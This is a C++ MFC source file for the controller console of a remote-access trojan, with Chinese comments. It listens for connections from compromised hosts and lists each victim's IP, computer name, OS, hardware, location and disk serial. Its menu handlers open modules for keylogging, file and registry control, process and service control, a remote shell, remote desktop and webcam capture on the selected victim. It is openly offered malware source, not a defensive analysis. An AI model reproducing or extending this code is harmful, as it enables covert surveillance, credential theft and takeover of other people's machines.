
// ClientDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "ClientDlg.h"
#include "afxdialogex.h"
#include "TcpTran.h"
#include "comm.h"
#include "NL_QQwry.h"
#include "ServiceManageDlg.h"
#include "FileManageDlg.h"
#include "KeyLogDlg.h"
#include "ProcManageDlg.h"
#include "RegManageDlg.h"
#include "RemoteDesktopDlg.h"
#include "ShellDlg.h"
#include "VideoManage.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

CClientDlg *m_clientdlg = NULL;
LINKINFO m_linkinfo;
LINKINFO clientLinkinfo;

int item = 0;
u_short u_port = 0   ;
string str_ip ;

char  client_ip[32] = {0} ;
static int nrItemNum = 0;

std::vector <TMPSOCKET *> tmp_vector;




// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()

};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
	
END_MESSAGE_MAP()


// CClientDlg 对话框




CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CClientDlg::IDD, pParent)
{  
	m_clientdlg = this; //新添加的
}

void CClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_list);
	DDX_Control(pDX, IDC_BUTTON1, m_btn_start);
	DDX_Control(pDX, IDC_BUTTON2, m_btn_stop);
}

BEGIN_MESSAGE_MAP(CClientDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CClientDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CClientDlg::OnBnClickedButton2)
	ON_NOTIFY(NM_CLICK, IDC_LIST1, &CClientDlg::OnNMClickList1)
	ON_COMMAND(ID_FILE_CTRL,OnFileCtrl)
	ON_COMMAND(ID_KEY_LOG, OnKeyLog)
	ON_COMMAND(ID_PROC_CTRL,OnProcCtrl)
	ON_COMMAND(ID_REG_CTRL, OnRegCtrl)
	ON_COMMAND(ID_REMOTE_DESK_CTRL, OnRemoteDeskCtrl)
	ON_COMMAND(ID_REMOTE_SHELL, OnRemoteShell)
	ON_COMMAND(ID_SERV_CTRL, OnServCtrl)
	ON_COMMAND(ID_VIDEO,OnVideo)
	ON_WM_CONTEXTMENU()
END_MESSAGE_MAP()


// CClientDlg 消息处理程序

BOOL CClientDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标
	LONG lStyle = m_list.SendMessage(LVM_GETEXTENDEDLISTVIEWSTYLE);
	lStyle |= LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_HEADERDRAGDROP;
	m_list.SendMessage(LVM_SETEXTENDEDLISTVIEWSTYLE, 0,(LPARAM)lStyle);
	LV_COLUMN lvc;
	
	lvc.mask = LVCF_TEXT | LVCF_SUBITEM | LVCF_WIDTH /*| LVCF_FMT*/;
	
	m_list.InsertColumn(0,"被控端IP地址信息",LVCFMT_LEFT,120,0);
	m_list.InsertColumn(1,"计算机名",LVCFMT_LEFT,90,0);
    m_list.InsertColumn(2,"操作系统",LVCFMT_LEFT,100,0);
	m_list.InsertColumn(3,"CPU频率",LVCFMT_LEFT,80,0);
	m_list.InsertColumn(4,"内存容量",LVCFMT_LEFT,80,0);
	m_list.InsertColumn(5,"用户所在地域",LVCFMT_LEFT,100,0);
	m_list.InsertColumn(6,"软件版本",LVCFMT_LEFT,90,0);
	m_list.InsertColumn(7,"硬盘序列号",LVCFMT_LEFT,150,0);
	m_list.InsertColumn(8,"SOCKET",LVCFMT_LEFT,80,0);

	ShowWindow(SW_MINIMIZE);

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}
void CClientDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CClientDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


DWORD WINAPI ServerThread(LPVOID lp)
{
	LPLINKINFO  plast_linkinfo =(LPLINKINFO)lp ; 
    CTcpTran m_tcptran ;
    m_tcptran.m_Socket  =  plast_linkinfo->s ;

	SYSTEMINIT m_sendmsg ;
	char ReceiveBuf[sizeof(m_sendmsg)] = {0};
    int  DataLen = 0;
    DataLen = m_tcptran.myrecv(m_tcptran.m_Socket,(char *)&m_sendmsg,sizeof(m_sendmsg),0,60,0,false) ;   //接收被控端发来的计算机信息
	if (DataLen == 0) 
	{
		closesocket(m_tcptran.m_Socket);
		ExitThread(0);
	}

	BOOL  BDeleteid =FALSE;
	UINT  InseartItem =0;	
	for(int j = 0; j<tmp_vector.size();j++)
	{
		if (stricmp(m_sendmsg.HDSerial,tmp_vector[j]->HDSerial)==0)     //如果已经存在该硬盘序列号
		{

			for(int i=0; i<m_clientdlg->m_list.GetItemCount(); i++)
			{
				if(stricmp(m_sendmsg.HDSerial,tmp_vector[j]->HDSerial)==0 )    //从客户端列表中查询
				{
					BDeleteid = TRUE;
					InseartItem = i;

				}
			}
			tmp_vector.erase(tmp_vector.begin()+j);			      //从容器中移除			
		}
	}

		CString tmp = _T("");
		CString m_phyaddr = _T("");	
		int mm = m_clientdlg->m_list.GetItemCount();

		if (BDeleteid)
		{
            mm = InseartItem;
			m_clientdlg->m_list.DeleteItem(InseartItem);    //从列表中移除
		}
		
		tmp.Format("%s",client_ip);                         //显示IP	
		m_clientdlg->m_list.InsertItem(mm,"");              //列表控件，首先插入一个空的行
		m_clientdlg->m_list.SetItemText(mm,0,tmp);
		
		tmp.Format("%s",m_sendmsg.computer);                //显示计算机名
		
		m_clientdlg->m_list.SetItemText(mm,1,tmp);
		
		tmp.Format("%s",m_sendmsg.os);                      //显示操作系统
		
		m_clientdlg->m_list.SetItemText(mm,2,tmp);
		
		tmp.Format("%s",m_sendmsg.processor);               //显示处理器信息
		m_clientdlg->m_list.SetItemText(mm,3,tmp);
		
		tmp.Format("%s",m_sendmsg.mem);                     //显示内存
		m_clientdlg->m_list.SetItemText(mm,4,tmp);
		IPwry ipinfo;

		m_phyaddr =ipinfo.IP2Add(client_ip);                

		
		tmp.Format("%s",m_sendmsg.mem); 
		m_clientdlg->m_list.SetItemText(mm,5,m_phyaddr);    //显示IP地址来源地
		
		tmp.Format("%s",m_sendmsg.version);                 //显示软件版本
		m_clientdlg->m_list.SetItemText(mm,6,tmp);
		
		tmp.Format("%s",m_sendmsg.HDSerial);                //显示硬盘序列号
		m_clientdlg->m_list.SetItemText(mm,7,tmp);
		
		tmp.Format("%d",m_tcptran.m_Socket);                //当前socket
		m_clientdlg->m_list.SetItemText(mm,8,tmp);      
		
		
		TMPSOCKET *tmp00 = new TMPSOCKET;
		memset(tmp00,0,sizeof(TMPSOCKET));	
		tmp00->ClientSocket = m_tcptran.m_Socket;	
		lstrcpy(tmp00->HDSerial,m_sendmsg.HDSerial);	
		tmp_vector.push_back(tmp00);		                //将当前主机标识压入容器
	return true;
}

DWORD WINAPI MyServerThread()
{

	CTcpTran m_tcptran ;
	m_tcptran.InitSocketLibray(2,2);
	SOCKET ServerSocket = m_tcptran.InitSocket(SOCKETBIND,str_ip,u_port,0);
	if (ServerSocket == SOCKET_ERROR)
	{        
		closesocket(ServerSocket);
		AfxMessageBox("SOCKET_ERROR");
		
		return -1;
	}

	struct	sockaddr_in Client_addr ;
	memset((void *)&Client_addr,0,sizeof(Client_addr));  

	int addrlen = sizeof(sockaddr_in);

	SOCKET ClientSocket ;
	HANDLE hThread =NULL ;
	DWORD Threadid = 0 ;

	while(1)                //循环等待监听
    {
		ClientSocket = m_tcptran.myaccept(ServerSocket,(struct sockaddr*)&Client_addr,&addrlen) ;
		if(ClientSocket == SOCKET_ERROR)             //返回新创建的套接字
			break;
		strcpy( client_ip, inet_ntoa(Client_addr.sin_addr) );    //新创建的套接字的地址结构
		clientLinkinfo.s = ClientSocket ;                        //全局变量clientLinkinfo
		clientLinkinfo.BindPort  = m_linkinfo.BindPort ;		
		hThread = CreateThread(0,0,ServerThread,(LPVOID)&clientLinkinfo,0,&Threadid);	//创建ServerThread线程  
    
	}

	return 0;
}

void CClientDlg::OnBnClickedButton1()        //开始按钮
{
	// TODO: 在此添加控件通知处理程序代码
	CString m_ip   = _T("");
	CString m_port = _T("");

	GetDlgItemText(IDC_EDIT1,m_ip);
    GetDlgItemText(IDC_EDIT2,m_port);

	char  *ch_ip =NULL ;


	str_ip = m_ip.GetBuffer(0);
	u_port = _ttoi(m_port);

	m_btn_start.EnableWindow(FALSE);
	m_btn_stop.EnableWindow(TRUE);

//////////////////////////////////////////////////////////////////////////
// 提交网络连接
//////////////////////////////////////////////////////////////////////////

	DWORD  Threadid = 0;
	HANDLE hThread  = CreateThread(0,0,(LPTHREAD_START_ROUTINE)MyServerThread,NULL,0,&Threadid);
}


void CClientDlg::OnBnClickedButton2()       //停止按钮
{
	COMMAND m_command;
	m_command.wCmd= CMD_RETRY; //CMD_NULL
	CTcpTran m_tcptran;
	CString id;
	id = m_clientdlg->m_list.GetItemText(item,7);
	char HDSerial[64] = {0};
	id.Format("%s",HDSerial);
	SOCKET mmclose;
	for(int j = 0; j<tmp_vector.size();j++)
	{
		mmclose =tmp_vector[j]->ClientSocket;
		m_tcptran.mysend(mmclose,(char *)&m_command,sizeof(COMMAND),0,60);
		shutdown(mmclose, SD_BOTH);
		Sleep(50);
		closesocket(mmclose);
	}
	
	m_list.DeleteAllItems();

	m_btn_start.EnableWindow(TRUE);
	m_btn_stop.EnableWindow(FALSE);
}


void CClientDlg::OnNMClickList1(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
}


void CClientDlg::OnContextMenu(CWnd* pWnd, CPoint point)
{
	// TODO: 在此处添加消息处理程序代码
	{
		if (point.x == -1 && point.y == -1){
			//keystroke invocation
			CRect rect;
			GetClientRect(rect);
			ClientToScreen(rect);

			point = rect.TopLeft();
			point.Offset(5, 5);
		}

		CMenu menu;
		VERIFY(menu.LoadMenu(IDR_ALL));

		CMenu* pPopup = menu.GetSubMenu(0);
		ASSERT(pPopup != NULL);
		CWnd* pWndPopupOwner = this;

		while (pWndPopupOwner->GetStyle() & WS_CHILD)
			pWndPopupOwner = pWndPopupOwner->GetParent();

		pPopup->TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON, point.x, point.y,
			pWndPopupOwner);
	}
}


void CClientDlg::OnFileCtrl()
{
	// TODO: 在此添加命令处理程序代码
	int i = m_list.GetSelectionMark();
	string str = m_list.GetItemText(i,8);
	SOCKET s = atoi(str.c_str()); 
	CFileManageDlg m_filemanageDlg(s);
	m_filemanageDlg.DoModal();
	
}


void CClientDlg::OnKeyLog()
{
	// TODO: 在此添加命令处理程序代码
	int i = m_list.GetSelectionMark();
	string str = m_list.GetItemText(i,8);
	SOCKET s = atoi(str.c_str()); 
	CKeyLogDlg m_KeylogDlg(s);
	m_KeylogDlg.DoModal();		
}


void CClientDlg::OnProcCtrl()
{
	// TODO: 在此添加命令处理程序代码
	int i = m_list.GetSelectionMark();
	string str = m_list.GetItemText(i,8);
	SOCKET s = atoi(str.c_str());
	CProcManageDlg m_ProcManageDlg(s);   
    m_ProcManageDlg.DoModal(); 
	//传输socket 
	//g__clientsocket 
}


void CClientDlg::OnRegCtrl()
{
	// TODO: 在此添加命令处理程序代码
	int i = m_list.GetSelectionMark();
	string str = m_list.GetItemText(i,8);
	SOCKET s = atoi(str.c_str());
	CRegManageDlg m_regmanageDlg(s);
	m_regmanageDlg.DoModal();
}


void CClientDlg::OnRemoteDeskCtrl()
{
	// TODO: 在此添加命令处理程序代码
	int i = m_list.GetSelectionMark();
	string str = m_list.GetItemText(i,8);
	SOCKET s = atoi(str.c_str()); 
    CRemoteDesktopDlg m_remotedesktopDlg(s);
	m_remotedesktopDlg.DoModal();		
}


void CClientDlg::OnRemoteShell()
{
	// TODO: 在此添加命令处理程序代码
	int i = m_list.GetSelectionMark();
	string str = m_list.GetItemText(i,8);
	SOCKET s = atoi(str.c_str()); 
	CShellDlg m_shellDlg(s);
	m_shellDlg.DoModal();	
}

void CClientDlg::OnServCtrl()
{
	// TODO: 在此添加命令处理程序代码
	int i = m_list.GetSelectionMark();
	string str = m_list.GetItemText(i,8);
	SOCKET s = atoi(str.c_str()); 
	CServiceManageDlg m_ServiceManageDlg(s);   
	m_ServiceManageDlg.DoModal(); 

}


void CClientDlg::OnVideo()
{
	// TODO: 在此添加命令处理程序代码
	int i = m_list.GetSelectionMark();
	string str = m_list.GetItemText(i,8);
	SOCKET s = atoi(str.c_str());
	CVideoManage m_videomanageDlg(s);
	
	char  tmp_HDSerial[64] = {0};

	m_clientdlg->m_list.GetItemText(item,7,tmp_HDSerial,64);
	
	for(int ppp = 0; ppp<tmp_vector.size();ppp++)
	{
		if (stricmp(tmp_HDSerial,tmp_vector[ppp]->HDSerial)==0)
		{
			m_videomanageDlg.ClientSocket=tmp_vector[ppp]->ClientSocket;
		}		
	}
	m_videomanageDlg.DoModal();	
}
